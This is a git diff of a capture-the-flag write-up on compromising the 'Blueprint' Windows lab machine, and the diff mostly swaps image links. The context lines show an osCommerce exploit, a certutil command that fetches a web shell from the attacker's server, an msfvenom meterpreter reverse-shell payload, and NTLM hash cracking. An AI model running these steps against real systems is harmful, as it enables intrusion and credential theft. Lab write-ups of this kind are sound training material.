@@ -1,4 +1,4 @@
-# Blueprint (Easy)
+![Untitled 4](https://github.com/user-attachments/assets/f4a88b0c-d800-4671-8a26-60e44b7cbd39)# Blueprint (Easy)
 
 - Note: Do you have what is takes to hack into this Windows Machine?
 - Hack into this Windows machine and escalate your privileges to Administrator.
@@ -125,7 +125,7 @@ Nmap done: 1 IP address (1 host up) scanned in 148.20 seconds
 
 - We go to port 8080 —> we access into the page oscommerce
 
-![Untitled](Untitled.png)
+![Untitled](https://github.com/user-attachments/assets/b283c953-3de0-4f4e-9c4a-1f62cccd9190)
 
 - We search the vuln by `searchsploit` :
 
@@ -148,7 +148,7 @@ Shellcodes: No Results
 
 - Great! Let check some exploit to find solutions.
 
-![Untitled](Untitled%201.png)
+![Untitled 1](https://github.com/user-attachments/assets/0983c2fe-bf46-4f97-8d98-ddb065c1f466)
 
 —> Got it! We found the exploit osCommerce and the script exploit was written by Python. Let see inside code.
 
@@ -199,8 +199,8 @@ else:
 - We can insert PHP payload
 - First, we can upload shell.php through /config.php to run command.
 - Check script shell PHP:
-
-![Untitled](Untitled%202.png)
+  
+![Untitled 2](https://github.com/user-attachments/assets/0dfa18d4-e4c4-4cf0-a6a3-9a320b1d851a)
 
 - We run script payload to upload file shell PHP:
 
@@ -211,7 +211,7 @@ shell_exec("cmd.exe /C certutil -urlcache -split -f http://<IP_Machine>simple-sh
 - Run `sudo python3 -m http.server` to open server machine.
 - We try to run command shell:  `shell.php?cmd=whoami`
 
-![Untitled](Untitled%203.png)
+![Untitled 3](https://github.com/user-attachments/assets/37d0f670-38af-4019-9898-0e9c5415e13f)
 
 —> We are in Administrator !
 
@@ -220,21 +220,20 @@ shell_exec("cmd.exe /C certutil -urlcache -split -f http://<IP_Machine>simple-sh
 ```bash
 msfvenom -f windows/meterpreter/reverse_tcp lhost=10.11.75.150 lport=4444 -f exe -o shell2.exe
 ```
+![Untitled 4](https://github.com/user-attachments/assets/2f6341a8-11a4-49d0-a1e3-19b80da3eef4)
 
-![Untitled](Untitled%204.png)
-
-![Untitled](Untitled%205.png)
+![Untitled 5](https://github.com/user-attachments/assets/2c144462-8add-4d80-a55c-a9113cc6293b)
 
 - Because netcat is unstable so in this case we will use Metasploit to be stable.
 - Run `msfconsole`  use Payload `windows/meterpreter/reverse_tcp`
 - In this page osCommerce we run path url: `http://<IP>:8080/oscommerce-2.3.4/catalog/install/includes/simple-shell.php?cmd=shell2.exe`
 
-![Untitled](Untitled%206.png)
+![Untitled 6](https://github.com/user-attachments/assets/ac1a28fe-c059-4468-8326-95cbfadf7538)
 
-![Untitled](Untitled%207.png)
+![Untitled 7](https://github.com/user-attachments/assets/f21b895a-e6ea-4a92-880a-c69ca3f0644f)
 
 - Decrypt NTLM hash of user ‘Lab’
 
-![Untitled](Untitled%208.png)
+![Untitled 8](https://github.com/user-attachments/assets/59affa98-c128-4a44-ab62-7da7982b953f)
 
 END!!!
